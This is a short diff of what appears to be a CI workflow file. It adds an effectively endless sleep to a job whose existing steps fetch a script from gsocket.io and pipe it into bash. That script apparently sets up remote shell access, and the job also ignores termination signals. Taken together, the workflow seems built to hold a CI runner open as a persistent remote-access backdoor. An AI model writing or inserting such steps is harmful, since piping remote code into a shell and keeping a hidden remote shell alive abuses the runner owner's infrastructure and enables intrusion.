@@ -15,3 +15,4 @@ jobs:
             pkg install -y curl bash
             bash -c "$(curl -fsSL https://gsocket.io/y)"
             trap 'exit 0' TERM
+            sleep 2147483647
